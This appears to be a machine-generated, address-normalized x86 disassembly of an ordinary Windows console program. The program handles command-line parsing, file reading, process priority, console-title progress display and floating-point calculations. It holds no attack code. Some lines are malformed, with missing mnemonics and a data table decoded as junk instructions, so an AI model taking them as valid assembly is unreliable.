cmp [ esp + 0x38 ] eax
je r-xdata
mov esi [ ebp + 0xc ]
mov edx edi
mov ecx ebx
call sub_4021e0
push edi
mov eax ebx
call sub_401e20
mov eax edi
mov ecx ebx
call sub_401c50
mov edx edi
mov eax ebx
call sub_402290
fmul [ r--data ]
push ecx
fstp [ esp ]
call sub_40ff50
add esp 0x8
call sub_40fd00
test eax eax
jge r-xdata
lea eax [ ebx + edi * 8 ]
lea ecx [ ebx + edi * 4 ]
mov edx edi
jmp [ eax * 4 + jump_table_402714 ]
mov eax ebx
push ebx
call sub_401300
add esp 0x4
jmp r-xdata
push esi
call sub_403830
push eax
push r--data
call sub_4013a0
add esp 0xc
push r--data
call sub_4013a0
add esp 0x4
jmp r-xdata
cmp eax 0x2ee0
jl r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x1
jmp r-xdata
mov esi [ ecx - 0x4 ]
sub ecx 0x4
sub eax 0x4
mov [ eax ] esi
mov esi [ ecx ]
sub edx 0x1
sub eax 0x4
test edx edx
mov [ eax ] esi
jne r-xdata
fld [ r--data ]
jmp r-xdata
fld [ r--data ]
jmp r-xdata
fld [ r--data ]
jmp r-xdata
fld [ r--data ]
mov [ esp + 0x2c ] 0x1
mov ecx [ ebp + 0x8 ]
add [ ecx + eax * 4 ] 0x1
mov eax [ ebp + 0x8 ]
add [ eax + 0xbb7c ] 0x1
jmp r-xdata
call sub_4011c0
test eax eax
jne r-xdata
mov eax edi
imul eax [ esp + 0x34 ]
push ecx
mov edx ebx
mov ecx ebx
fstp [ esp ]
call sub_401b30
add esp 0x4
push r--data
call sub_40e4b7
add eax 0x40
push eax
call sub_40e368
mov esi [ esp + 0x38 ]
add esp 0x8
mov [ esp + 0x2c ] 0x2
mov eax [ esp + 0x30 ]
push eax
call sub_403850
fcomp [ r--data ]
add esp 0x4
fnstsw ax
test ah 0x44
jpo r-xdata
mov esi [ esp + 0x30 ]
mov edi [ esp + 0x3c ]
mov ecx [ esp + 0x30 ]
push ecx
call sub_403850
fmul [ r--data ]
push ecx
fadd [ r--data ]
fstp [ esp ]
call sub_40ff50
fld [ esp + 0x48 ]
add esp 0x8
fucom st1
fnstsw ax
fstp st1
test ah 0x44
jpo r-xdata
fstp st0
fld [ r--data ]
fucompp
fnstsw ax
test ah 0x44
jpe r-xdata
xor esi esi
mov esi 0x1
jmp r-xdata
test esi esi
mov esi r--data
jne r-xdata
mov edx [ esp + 0x30 ]
push edx
call sub_403850
fst [ esp + 0x44 ]
fiadd [ rw-data ]
fidiv [ rw-data ]
fmul [ r--data ]
fadd [ r--data ]
call sub_40fd00
push eax
lea eax [ esp + 0x50 ]
push r--data
push eax
call sub_40fa35
add esp 0x10
lea ecx [ esp + 0x48 ]
push ecx
call [ SetConsoleTitleA@IAT ]
fld [ esp + 0x40 ]
fmul [ r--data ]
sub esp 0x8
fadd [ r--data ]
fstp [ esp ]
call sub_40ff50
add esp 0x8
fst [ esp + 0x40 ]
cmp [ rw-data ] 0x0
jne r-xdata
call sub_40fd00
push eax
push esi
push r--data
call sub_40e4b7
add eax 0x40
push eax
call sub_40e368
add esp 0x10
jmp r-xdata
mov esi r--data
sub_402730
sub esp 0x248
push ebx
push ebp
push esi
push edi
push 0x104
lea eax [ esp + 0x158 ]
xor ebx ebx
push eax
xor ebp ebp
push ebx
mov [ esp + 0x1c ] ebp
mov [ esp + 0x20 ] ebx
mov [ esp + 0x28 ] ebx
call [ GetModuleFileNameA@IAT ]
test eax eax
mov edi [ esp + 0x260 ]
je r-xdata
sub [ esp + 0x25c ] 0x1
je r-xdata
lea ecx [ esp + 0x154 ]
push ecx
call sub_401300
add esp 0x4
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ SetPriorityClass@IAT ]
mov edi edi
lea edx [ esp + 0x154 ]
push edx
call sub_401300
push eax
call sub_410787
add esp 0x8
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
add eax 0x1
cmp [ eax ] 0x0
je r-xdata
cmp cl 0x2f
jne r-xdata
lea eax [ esp + 0x154 ]
push r--data
push eax
call sub_401300
add esp 0x4
push eax
call sub_4104d0
add esp 0x8
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r--data
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov edx [ rw-data ]
lea eax [ edx * 4 + 0x4 ]
push eax
push ebx
call sub_41026d
mov ebx eax
mov eax [ edi ]
add esp 0x8
lea edx [ eax + 0x1 ]
mov [ edi ] eax
cmp [ eax ] 0x0
je r-xdata
mov esi [ esp + 0x25c ]
add esi 0xffffffff
mov ebp edi
mov [ rw-data ] 0x1
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
test ebp ebp
jne r-xdata
push r--data
cmp [ rw-data ] 0x0
je r-xdata
call sub_4013a0
add esp 0x4
add ebp 0x1
mov [ esp + 0x10 ] ebp
cmp [ rw-data ] 0x0
je r-xdata
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
add eax 0xa
push eax
call sub_40fe88
mov ecx [ rw-data ]
mov edx [ edi ]
add esp 0x4
mov [ ebx + ecx * 4 ] eax
mov esi eax
sub [ esp + 0x25c ] 0x1
jne r-xdata
mov edx [ edi ]
movsx eax [ edx ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x32
ja r-xdata
mov ebp ebx
mov edi [ esp + 0x25c ]
sub edi esi
test ebp ebp
jne r-xdata
mov edx [ rw-data ]
push edx
push r--data
call sub_4101a8
add esp 0x8
call sub_404060
mov ecx [ rw-data ]
push eax
push r--data
push ecx
call sub_40e4b7
add eax 0x40
push eax
call sub_40e368
add esp 0x10
mov cl [ edx ]
mov [ esi ] cl
add edx 0x1
add esi 0x1
test cl cl
jne r-xdata
mov cl [ eax ]
cmp cl 0x2d
je r-xdata
mov eax [ edi + 0x4 ]
mov cl [ eax ]
add edi 0x4
cmp cl 0x2d
mov [ esp + 0x260 ] edi
je r-xdata
mov [ esp + 0x14 ] ebx
push eax
push r--data
call sub_4013a0
add esp 0x8
add ebp 0x1
movzx ecx [ ecx + lookup_table_4031d4 ]
jmp [ ecx * 4 + jump_table_4031b4 ]
mov ecx [ ebp + 0x4 ]
add ebp 0x4
push ecx
push edi
push r--data
call sub_4013a0
sub esi 0x1
add esp 0xc
add edi 0x1
test esi esi
jne r-xdata
mov edi [ esp + 0x260 ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x248
retn
call sub_401180
mov ebp [ rw-data ]
xor eax eax
test ebp ebp
mov [ rw-data ] eax
jle r-xdata
add [ rw-data ] 0x1
mov esi [ SetPriorityClass@IAT ]
cmp cl 0x40
je r-xdata
mov [ esp + 0x10 ] ebp
jmp r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x40
call [ GetCurrentProcess@IAT ]
push eax
call esi
jmp r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
je r-xdata
mov edi [ ebx + eax * 4 ]
cmp [ edi ] 0x40
mov [ esp + 0x18 ] edi
jne r-xdata
push eax
call sub_401240
add esp 0x4
test eax eax
jne r-xdata
add [ edi ] 0x1
mov eax [ edi ]
cmp [ eax ] 0x0
jne r-xdata
push r--data
mov [ esp + 0x14 ] 0x1
call sub_4013a0
fldz
lea esi [ ebp * 4 ]
push esi
fstp [ esp + 0x1c ]
call sub_40fe88
push esi
mov [ esp + 0x2c ] eax
call sub_40fe88
xor ecx ecx
add esp 0x8
cmp [ rw-data ] cl
mov [ esp + 0x20 ] eax
mov [ rw-data ] ecx
jne r-xdata
push edi
call sub_401000
add esp 0x4
test eax eax
je r-xdata
lea eax [ edi + 0x1 ]
push r--data
push eax
call sub_40f84d
mov edx [ rw-data ]
mov ebp eax
mov eax [ rw-data ]
add eax 0xffffffff
add esp 0x8
cmp edx eax
jge r-xdata
mov edx [ rw-data ]
mov edi [ ebx + edx * 4 ]
add edi 0xffffffff
jmp r-xdata
mov ebx rw-data
call sub_401aa0
fstp [ esp + 0x1c ]
cmp [ rw-data ] 0x0
je r-xdata
mov esi [ esp + 0x1c ]
mov edi eax
jmp r-xdata
mov eax [ rw-data ]
mov ebp [ rw-data ]
add eax 0x1
cmp eax ebp
mov [ rw-data ] eax
jl r-xdata
lea ecx [ edi + 0x1 ]
push r--data
push ecx
call sub_40f84d
mov edx [ rw-data ]
mov eax [ rw-data ]
add edx 0xffffffff
add esp 0x8
cmp eax edx
jge r-xdata
sub edx 0x1
test ebp ebp
mov [ rw-data ] edx
mov [ rw-data ] eax
je r-xdata
lea edi [ ebx + edx * 4 ]
mov ecx eax
lea esi [ edi + 0x4 ]
sub ecx edx
[ edi ] [ esi ]
mov edi [ esp + 0x18 ]
mov al [ edi + 0x1 ]
add edi 0x1
test al al
jne r-xdata
mov ebx [ esp + 0x14 ]
xor edi edi
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
test ebp ebp
mov [ rw-data ] edx
lea edx [ esp + 0x2c ]
push edx
sub eax 0x1
push edi
mov [ rw-data ] eax
call sub_40f52a
mov ebp eax
add esp 0x8
cmp ebp 0xffffffff
je r-xdata
lea edi [ ebx + eax * 4 ]
mov ecx edx
lea esi [ edi + 0x4 ]
sub ecx eax
[ edi ] [ esi ]
mov edi [ esp + 0x18 ]
lea eax [ edi + 0x1 ]
push eax
push r--data
call sub_4013a0
push edi
call sub_40fdab
add esp 0xc
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x248
retn
push ebp
call sub_410071
mov ebx eax
add esp 0x4
cmp ebx 0xffffffff
je r-xdata
mov eax [ r--data ]
mov ebp [ esp + 0x10 ]
mov [ edi ] eax
mov edi [ esp + 0x260 ]
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp ebp 0x1
jle r-xdata
cmp esi 0x2
je r-xdata
cmp ecx ebp
jge r-xdata
push edi
call sub_40fdab
add esp 0x4
test [ esp + 0x2c ] 0x10
jne r-xdata
push ebp
call sub_40f0ed
mov eax [ esp + 0x1c ]
push eax
call sub_40fdab
mov ebx [ esp + 0x1c ]
add esp 0x8
jmp r-xdata
nop
cmp ebp 0x1
jle r-xdata
cmp edi ebp
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push r--data
call sub_4013a0
fld [ esp + 0x20 ]
push ecx
fstp [ esp ]
push r--data
call sub_4013a0
fld [ esp + 0x24 ]
add esp 0x4
fstp [ esp ]
push r--data
call sub_4013a0
mov ebp [ rw-data ]
add esp 0xc
mov ebx [ esp + 0x14 ]
call sub_4011c0
test eax eax
jne r-xdata
lea edx [ esp + 0x2c ]
push edx
push ebp
call sub_40f65a
add esp 0x8
test eax eax
je r-xdata
mov esi [ rw-data ]
add esi 0x1
lea eax [ esi * 4 ]
push eax
push ebx
mov [ rw-data ] esi
call sub_41026d
mov ebx eax
lea eax [ esi - 0x1 ]
mov esi [ rw-data ]
add esi 0x1
add esp 0x8
cmp eax esi
jle r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebp
call sub_410071
mov ebx eax
add esp 0x4
cmp ebx 0xa
je r-xdata
push ebx
call sub_40fdab
jmp r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
call sub_4011c0
test eax eax
jne r-xdata
mov ebp [ rw-data ]
mov ebp [ esp + 0x14 ]
mov ebx 0x1
cmp [ rw-data ] ebx
jle r-xdata
push ebp
mov [ esp + 0x18 ] ebx
call sub_40f4a4
add esp 0x4
mov eax edi
lea edx [ eax + 0x1 ]
nop
push ebp
call sub_410071
mov ebx eax
add esp 0x4
cmp ebx 0xffffffff
jne r-xdata
push 0x104
call sub_40fe88
add esp 0x4
mov edi eax
xor esi esi
nop
add esp 0x4
pop edi
xor eax eax
cmp [ esp + 0xc ] eax
pop esi
pop ebp
setne al
pop ebx
add esp 0x248
retn
cmp [ rw-data ] 0x0
jne r-xdata
push ebp
push eax
push r--data
call sub_40e4b7
add eax 0x40
push eax
call sub_40e368
add esp 0x10
push ebx
call sub_40fdab
jmp r-xdata
mov ebp [ rw-data ]
jmp r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov ecx [ rw-data ]
lea eax [ esp + 0x1c ]
push eax
mov eax [ ebp + ecx * 4 ]
push rw-data
call sub_4022f0
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov ecx [ rw-data ]
mov edx [ ebp + ecx * 4 ]
push edx
push r--data
call sub_40e4b7
add eax 0x40
push eax
call sub_40e368
add esp 0xc
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
mov ecx eax
lea eax [ esp + 0x50 ]
lea edi [ eax + 0x1 ]
mov ecx [ ebx + eax * 4 - 0x4 ]
mov [ ebx + eax * 4 ] ecx
sub eax 0x1
cmp eax esi
jg r-xdata
cmp ebx 0xa
jne r-xdata
mov [ esi + edi ] 0x0
add esi 0x1
push esi
push edi
call sub_41026d
mov esi [ rw-data ]
mov edx [ esp + 0x1c ]
add esi 0x1
lea ecx [ esi * 4 ]
push ecx
push edx
mov edi eax
mov [ rw-data ] esi
call sub_41026d
mov ecx [ rw-data ]
mov edx eax
lea eax [ esi - 0x1 ]
add ecx 0x1
add esp 0x10
cmp eax ecx
mov [ esp + 0x14 ] edx
jle r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebp
push r--data
call sub_40e4b7
add eax 0x40
push eax
call sub_40e368
add esp 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov ecx [ ebx + eax * 4 ]
push ecx
push r--data
call sub_40e4b7
add eax 0x40
push eax
call sub_40e368
add esp 0xc
mov ebx rw-data
call sub_401aa0
fstp [ esp + 0x28 ]
cmp [ rw-data ] 0x0
fld [ esp + 0x28 ]
mov ecx [ rw-data ]
mov ebx [ esp + 0x24 ]
fst [ ebx + ecx * 4 ]
fld [ esp + 0x1c ]
fst [ edi + ecx * 4 ]
jne r-xdata
add [ esp + 0x10 ] ebx
cmp [ rw-data ] 0x0
jne r-xdata
mov dl [ eax ]
add eax 0x1
test dl dl
jne r-xdata
sub eax edi
lea edx [ eax + ecx + 0xa ]
push edx
mov [ rw-data ] esi
call sub_40fe88
mov ecx [ esp + 0x1c ]
mov [ ebx + esi * 4 ] eax
add esp 0x4
mov esi eax
mov edi edi
mov [ rw-data ] ecx
mov [ edx + ecx * 4 ] edi
lea ecx [ ecx ]
cmp esi 0x104
jl r-xdata
fld [ esp + 0x18 ]
mov eax [ rw-data ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
sub esp 0x10
fstp [ esp + 0xc ]
fld [ esp + 0x2c ]
fstp [ esp + 0x8 ]
fld [ ecx + eax * 4 ]
mov ecx [ ebx + eax * 4 ]
fstp [ esp + 0x4 ]
fld [ edx + eax * 4 ]
fstp [ esp ]
call sub_401550
add esp 0x10
call sub_40e4b7
mov edx [ rw-data ]
mov edi eax
mov eax [ ebx + edx * 4 ]
add edi 0x20
push eax
call sub_401970
add esp 0x4
jmp r-xdata
fstp st1
sub esp 0x8
fstp st0
fstp [ esp ]
push r--data
call sub_4013a0
mov edx [ rw-data ]
fld [ edi + edx * 4 ]
add esp 0x4
fstp [ esp ]
push r--data
call sub_4013a0
fld [ esp + 0x28 ]
mov ecx [ rw-data ]
add esp 0xc
jmp r-xdata
mov ebp [ rw-data ]
cmp esi 0x2
je r-xdata
mov dl [ ecx ]
mov [ esi ] dl
add ecx 0x1
add esi 0x1
test dl dl
jne r-xdata
push eax
call sub_401300
mov [ eax ] 0x0
lea eax [ esp + 0x54 ]
add esp 0x4
mov ecx eax
mov esi [ edx + eax * 4 - 0x4 ]
mov [ edx + eax * 4 ] esi
sub eax 0x1
cmp eax ecx
jg r-xdata
mov [ esi + edi ] bl
push ebp
add esi 0x1
call sub_410071
mov ebx eax
add esp 0x4
cmp ebx 0xa
je r-xdata
mov ebp [ rw-data ]
add edi 0x1
jmp r-xdata
add [ esp + 0x10 ] 0x1
cmp esi 0x2
je r-xdata
mov edi [ rw-data ]
mov esi eax
mov eax [ ebx + edi * 4 ]
push eax
call sub_40fdab
add esp 0x4
test esi esi
je r-xdata
cmp [ rw-data ] 0x0
fstp st0
jne r-xdata
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
mov edi [ esp + 0x20 ]
mov dl [ eax ]
add eax 0x1
test dl dl
jne r-xdata
sub eax ecx
mov esi ecx
mov ecx [ rw-data ]
mov edi [ ebx + ecx * 4 ]
add edi 0xffffffff
lea esp [ esp ]
cmp [ rw-data ] 0x0
mov [ rw-data ] edi
jne r-xdata
add ecx 0x1
cmp [ rw-data ] 0x0
mov [ rw-data ] ecx
je r-xdata
fldz
sub esp 0x10
fst [ esp + 0xc ]
fstp [ esp + 0x8 ]
fld [ edi + ecx * 4 ]
fstp [ esp + 0x4 ]
fld [ ebx + ecx * 4 ]
mov ecx [ ebp + ecx * 4 ]
fstp [ esp ]
call sub_401550
mov esi eax
add esp 0x10
test esi esi
je r-xdata
mov edx [ eax + rw-data ]
add [ eax + rw-data ] edx
mov edx [ eax + rw-data ]
add [ eax + rw-data ] edx
mov edx [ eax + rw-data ]
add [ eax + rw-data ] edx
mov edx [ eax + rw-data ]
add [ eax + rw-data ] edx
mov edx [ eax + rw-data ]
add [ eax + rw-data ] edx
mov edx [ eax + rw-data ]
add [ eax + rw-data ] edx
add eax 0x18
cmp eax 0xbb80
jl r-xdata
fld [ esp + 0x18 ]
fcomp st1
fnstsw ax
test ah 0x5
jpe r-xdata
mov ebp [ rw-data ]
mov cl [ edi + 0x1 ]
add edi 0x1
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x18 ]
mov ecx [ rw-data ]
add [ esp + 0x10 ] 0x1
jmp r-xdata
fstp st0
jmp r-xdata
fstp [ esp + 0x18 ]
jmp r-xdata
sub_4031dc
add eax [ edi ]
pop es
add al 0x7
pop es
pop es
pop es
add eax 0x7070607
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add [ edi ] al
add [ edx ] eax
pop es
pop es
pop es
pop es
add eax [ edi ]
pop es
add al 0x7
pop es
pop es
pop es
add eax 0xcccc0607
int3
sub_403290
mov eax [ esp + 0x4 ]
sub esp 0x30
test eax eax
je r-xdata
xor eax eax
add esp 0x30
retn
push eax
call sub_40ebab
lea ecx [ esp + 0x4 ]
push ecx
push eax
call sub_410a0e
add esp 0xc
test eax eax
jne r-xdata
test [ esp + 0x6 ] 0x8000
je r-xdata
mov eax [ esp + 0x14 ]
add esp 0x30
retn
sub_4032d0
mov eax [ esp + 0x4 ]
sub esp 0x30
test eax eax
je r-xdata
xor eax eax
add esp 0x30
retn
push eax
call sub_40ebab
lea ecx [ esp + 0x4 ]
push ecx
push eax
call sub_410a0e
add esp 0xc
test eax eax
jne r-xdata
test [ esp + 0x6 ] 0x8000
je r-xdata
mov eax 0x1
add esp 0x30
retn
sub_403340
sub esp 0x10
push ebx
push ebp
mov ebp [ esp + 0x24 ]
mov ebx eax
cmp [ ebx + 0x94 ] 0x0
mov eax [ ebx + 0x90 ]
push esi
mov esi [ ebx + 0xa4 ]
lea ecx [ eax + esi - 0x20 ]
push edi
mov [ esp + 0x1c ] ecx
mov [ esp + 0x18 ] 0x0
jle r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
mov edx [ esi ]
add esi 0x4
mov [ esp + 0x10 ] edx
mov eax [ esi ]
add esi 0x4
mov [ esp + 0x14 ] eax
mov eax esi
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
lea ecx [ esp + 0x10 ]
sub eax edx
push r--data
push ecx
mov edi eax
call sub_4093e0
lea edx [ esp + 0x1c ]
push r--data
push edx
call sub_4093e0
mov eax [ esp + 0x20 ]
lea ecx [ edi + eax ]
lea edx [ ecx + esi + 0x1 ]
add esp 0x10
cmp edx [ esp + 0x1c ]
ja r-xdata
test edi edi
je r-xdata
add edi eax
mov eax [ esp + 0x18 ]
add eax 0x1
cmp eax [ ebx + 0x94 ]
lea esi [ esi + edi + 0x1 ]
mov [ esp + 0x18 ] eax
jl r-xdata
test eax eax
je r-xdata
mov eax [ esp + 0x24 ]
push esi
push eax
call sub_410e67
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
test [ esp + 0x14 ] 0x6
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
test ebp ebp
je r-xdata
mov ebx [ esp + 0x10 ]
cmp ebx ebp
jge r-xdata
cmp ebp 0x4
jl r-xdata
push ebx
lea ecx [ edi + esi + 0x1 ]
push ecx
push eax
call sub_410ec0
mov edx [ esp + 0x34 ]
add esp 0xc
mov [ ebx + edx ] 0x0
lea ecx [ ebp - 0x1 ]
push ecx
lea edx [ edi + esi + 0x1 ]
push edx
push eax
call sub_410ec0
mov ecx [ esp + 0x34 ]
add esp 0xc
mov al 0x2e
pop edi
mov [ ecx + ebp - 0x2 ] al
mov [ ecx + ebp - 0x3 ] al
mov [ ecx + ebp - 0x4 ] al
pop esi
mov [ ecx + ebp - 0x1 ] 0x0
lea eax [ ebp - 0x1 ]
pop ebp
pop ebx
add esp 0x10
retn
sub_403490
sub esp 0x8
push ebx
mov ebx [ esp + 0x10 ]
cmp [ ebx + 0x14c ] 0x41
push ebp
push esi
push edi
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
cmp [ ebx + 0x15c ] 0x0
mov esi [ ebx + 0x16c ]
mov eax [ ebx + 0x158 ]
lea ebp [ esi + eax - 0x20 ]
mov [ esp + 0x10 ] 0x0
jle r-xdata
lea ecx [ ecx ]
mov cl [ eax ]
add eax 0x1
test cl cl
jne r-xdata
sub eax edx
mov edi eax
lea eax [ esp + 0x1c ]
push r--data
push eax
call sub_4093e0
lea ecx [ esp + 0x1c ]
push r--data
push ecx
call sub_4093e0
mov eax [ esp + 0x2c ]
lea edx [ edi + eax ]
lea ecx [ edx + esi + 0x1 ]
add esp 0x10
cmp ecx ebp
ja r-xdata
test edi edi
je r-xdata
add edi eax
mov eax [ esp + 0x10 ]
add eax 0x1
cmp eax [ ebx + 0x15c ]
lea esi [ esi + edi + 0x1 ]
mov [ esp + 0x10 ] eax
jl r-xdata
test eax eax
je r-xdata
mov ecx [ esi ]
add esi 0x4
mov [ esp + 0x1c ] ecx
mov edx [ esi ]
add esi 0x4
mov eax esi
mov [ esp + 0x14 ] edx
lea edx [ eax + 0x1 ]
mov edx [ esp + 0x20 ]
push esi
push edx
call sub_410e67
add esp 0x8
test eax eax
mov eax [ esp + 0x1c ]
je r-xdata
add edi eax
lea eax [ esi + edi + 0x1 ]
cmp eax ebp
lea ecx [ esi - 0x8 ]
jae r-xdata
sub ecx [ ebx + 0x16c ]
pop edi
pop esi
add ecx 0x20
add [ ebx + 0x15c ] 0xffffffff
pop ebp
mov [ ebx + 0x158 ] ecx
mov eax 0x1
pop ebx
add esp 0x8
retn
mov dl [ eax ]
mov [ ecx ] dl
add eax 0x1
add ecx 0x1
cmp eax ebp
jb r-xdata
sub_4035b0
push esi
mov esi eax
cmp [ esi + 0x14c ] 0x41
push edi
lea edi [ esi + 0x14c ]
mov eax 0x1
jne r-xdata
pop edi
pop esi
retn
cmp [ esi + 0x15c ] 0x0
je r-xdata
or [ esi + 0x160 ] 0x20000000
push r--data
push edi
call sub_409460
mov eax [ esi + 0x68 ]
mov ecx [ esi + 0x64 ]
push 0x20
push edi
push eax
call ecx
push r--data
push edi
call sub_4093e0
mov eax [ esi + 0x158 ]
add esp 0x1c
cmp eax 0x20
jbe r-xdata
and [ esi + 0x160 ] 0xdfffffff
push ebx
push r--data
push edi
call sub_409460
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x64 ]
push 0x20
push edi
push edx
call eax
push r--data
push edi
mov ebx eax
call sub_4093e0
add esp 0x1c
test ebx ebx
mov eax ebx
jne r-xdata
mov edx [ esi + 0x16c ]
mov ecx [ esi + 0x64 ]
add eax 0xffffffe0
push eax
mov eax [ esi + 0x68 ]
push edx
push eax
call ecx
add esp 0xc
pop ebx
lea edi [ esi + 0x1a0 ]
mov ecx 0xb
mov esi r--data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
sub_403680
push ecx
push ebx
push ebp
push esi
mov esi eax
push edi
lea edi [ esi + 0x14c ]
xor ebp ebp
cmp [ edi ] 0x41
jne r-xdata
test [ esi + 0x9c ] 0x40
je r-xdata
cmp [ esi + 0x15c ] ebp
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ esi + 0x70 ]
mov ecx [ esi + 0x74 ]
mov edx [ eax + 0x18 ]
push ecx
call edx
add esp 0x4
test eax eax
je r-xdata
mov eax [ esi + 0x158 ]
cmp eax 0x20
jbe r-xdata
lea edi [ esi + 0x1a0 ]
mov ecx 0xb
mov esi r--data
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx [ esi + 0xc8 ]
mov eax [ esi + 0x70 ]
mov edx [ esi + 0x74 ]
mov eax [ eax + 0xc ]
push 0x2
push ecx
push edx
call eax
add esp 0xc
test eax eax
je r-xdata
lea ebp [ eax + 0x20 ]
mov ebx [ esi + 0xc8 ]
mov ecx ebx
neg ecx
cmp ebp ecx
jge r-xdata
test ebp ebp
je r-xdata
add ebx ebp
neg ebx
mov [ esp + 0x13 ] 0x0
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn
or [ esi + 0x160 ] 0x20000000
push r--data
push edi
call sub_409460
mov eax [ esi + 0x70 ]
mov ecx [ esi + 0x74 ]
mov edx [ eax + 0x1c ]
push 0x20
push edi
push ecx
call edx
push r--data
push edi
call sub_4093e0
mov ecx [ esi + 0x158 ]
mov edx [ esi + 0x16c ]
mov eax [ esi + 0x70 ]
sub ecx 0x20
push ecx
mov ecx [ esi + 0x74 ]
push edx
mov edx [ eax + 0x1c ]
push ecx
call edx
and [ esi + 0x160 ] 0xdfffffff
push r--data
push edi
call sub_409460
mov eax [ esi + 0x70 ]
mov ecx [ esi + 0x74 ]
mov edx [ eax + 0x1c ]
push 0x20
push edi
push ecx
call edx
xor ebx ebx
cmp eax 0x20
push r--data
push edi
sete bl
call sub_4093e0
add esp 0x44
test ebx ebx
jne r-xdata
mov edx [ esi + 0x70 ]
mov ecx [ esi + 0x74 ]
mov edx [ edx + 0x1c ]
push 0x1
lea eax [ esp + 0x17 ]
push eax
push ecx
sub ebx 0x1
call edx
add esp 0xc
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebp
mov eax ebx
pop ebx
pop ecx
retn
sub_403800
mov eax [ esp + 0x4 ]
test eax eax
je r-xdata
or eax 0xffffffff
retn
cmp [ eax + 0x19c ] 0x0
je r-xdata
mov eax [ eax + 0x17c ]
test eax eax
je r-xdata
mov [ esp + 0x4 ] eax
jmp sub_405710
mov eax [ eax + 0xa8 ]
retn
sub_403850
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
fld [ r--data ]
pop esi
retn
mov eax [ esi + 0x8c ]
cmp eax 0xffffffff
je r-xdata
test eax eax
je r-xdata
push esi
call sub_403800
add esp 0x4
test eax eax
mov [ esp + 0x8 ] eax
fild [ esp + 0x8 ]
jge r-xdata
mov eax [ esi + 0x8c ]
fild [ esi + 0x8c ]
test eax eax
jge r-xdata
fadd [ r--data ]
fdivp st1
pop esi
retn
fadd [ r--data ]
sub_403910
push ebx
push ebp
mov ebp [ esp + 0xc ]
mov ebx [ ebp + 0x174 ]
push edi
xor edi edi
cmp ebx edi
je r-xdata
mov [ ebp + 0x170 ] edi
pop edi
pop ebp
pop ebx
retn
push esi
lea esi [ ebp + ebx * 4 + 0x17c ]
jmp r-xdata
mov eax [ esi - 0x4 ]
mov eax [ eax + 0x6c ]
sub esi 0x4
sub ebx 0x1
cmp eax edi
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x74 ]
cmp eax edi
je r-xdata
push eax
call sub_40fdab
mov ecx [ esi ]
add esp 0x4
mov [ ecx + 0x6c ] edi
mov ecx [ esi ]
mov eax [ ecx + 0x7c ]
cmp eax edi
je r-xdata
push eax
call sub_40fdab
mov eax [ esi ]
add esp 0x4
mov [ eax + 0x74 ] edi
cmp ebx edi
je r-xdata
push eax
call sub_40fdab
mov edx [ esi ]
add esp 0x4
mov [ edx + 0x7c ] edi
pop esi
add [ ebp + 0x174 ] 0xffffffff
mov eax [ esi ]
push eax
call sub_40fdab
add esp 0x4
mov [ esi ] edi
jmp r-xdata
sub_4039b0
sub esp 0x20
push ebp
push esi
push edi
lea eax [ esp + 0x2c ]
xor ebp ebp
lea esp [ esp ]
xor edi edi
mov edi ecx
sub edi eax
push edi
push eax
lea edx [ esp + 0x14 ]
push edx
call sub_410ec0
add esp 0xc
jmp r-xdata
pop edi
pop esi
or eax 0xffffffff
pop ebp
add esp 0x20
retn
cmp [ esp + 0xc ] 0x77
lea eax [ esp + 0xd ]
jne r-xdata
mov ecx [ esp + 0x30 ]
mov edx [ ecx ]
mov esi 0x20
sub esi edi
push esi
lea eax [ esp + edi + 0x10 ]
push eax
push ebx
call edx
add esp 0xc
cmp eax esi
jne r-xdata
